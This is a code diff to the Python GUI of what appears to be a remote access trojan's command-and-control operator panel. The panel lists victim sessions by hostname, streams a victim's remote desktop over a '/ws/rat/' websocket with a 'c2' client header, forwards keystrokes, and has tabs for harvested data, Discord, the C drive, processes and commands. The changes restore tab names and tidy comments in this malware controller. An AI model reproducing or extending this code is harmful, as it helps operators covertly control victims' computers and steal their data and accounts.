@@ -60,6 +60,7 @@ class App(ctk.CTk):
         ctk.CTkLabel(header_frame, text=session_data.get('hostname', 'N/A'), font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)
         
         master_tab_view = ctk.CTkTabview(self.session_detail_frame); master_tab_view.grid(row=1, column=0, sticky="nsew")
+        # --- THIS IS THE FIX: Restore all tab names ---
         tab_names = ["Remote Desktop", "Live Actions", "Data Vault", "Discord", "C Drive", "Process Manager", "Commander", "Events"]
         for name in tab_names: master_tab_view.add(name)
         master_tab_view.set("Remote Desktop")
@@ -68,9 +69,8 @@ class App(ctk.CTk):
         self.populate_rat_tab(master_tab_view.tab("Remote Desktop"), session_id)
         self.populate_live_actions_tab(master_tab_view.tab("Live Actions"), session_id)
         self.populate_data_vault_tab(master_tab_view.tab("Data Vault"), session_data)
-        for name in tab_names[3:]: # Start from the 4th tab now
+        for name in tab_names[3:]:
             ctk.CTkLabel(master_tab_view.tab(name), text=f"'{name}' functionality not yet implemented.").pack(expand=True)
-        # --------------------------------------------------------
 
     def populate_rat_tab(self, tab, session_id):
         tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(1, weight=1)
@@ -84,6 +84,7 @@ class App(ctk.CTk):
         self.master.bind("<KeyPress>", self.handle_key_press)
 
     def populate_live_actions_tab(self, tab, session_id):
+        # --- THIS IS THE FIX: Restore the full contents of this function ---
         tab.grid_columnconfigure(0, weight=1)
         popup_frame = ctk.CTkFrame(tab); popup_frame.pack(fill="x", padx=10, pady=10)
         popup_frame.grid_columnconfigure(1, weight=1)
@@ -129,7 +130,6 @@ class App(ctk.CTk):
         ws_url = f"{WS_SERVER_URL}/ws/rat/{self.active_session_id}"
         headers = {'X-Client-Type': 'c2'}
         try:
-            # The 'extra_headers' argument is now supported by websockets v8.1
             async with websockets.connect(ws_url, extra_headers=headers) as self.rat_ws:
                 self.rat_screen_label.configure(text="Connected. Waiting for first frame...")
                 async for message in self.rat_ws:
@@ -199,7 +199,6 @@ class App(ctk.CTk):
     def add_session_widgets(self, session_id, hostname):
         container_frame = ctk.CTkFrame(self.sessions_frame, fg_color="transparent"); container_frame.pack(fill="x", padx=5, pady=2); container_frame.grid_columnconfigure(0, weight=1)
         session_button = ctk.CTkButton(container_frame, text=f"  {hostname}  |  {session_id[:8]}...  ", command=lambda sid=session_id: self.show_session_data(sid)); session_button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
-        # --- THIS IS THE TYPO FIX ---
         delete_button = ctk.CTkButton(container_frame, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda sid=session_id: self.delete_session_handler(sid)); delete_button.grid(row=0, column=1, sticky="e")
         self.session_widgets[session_id] = {"frame": container_frame, "button": session_button}
     def delete_session_handler(self, session_id):
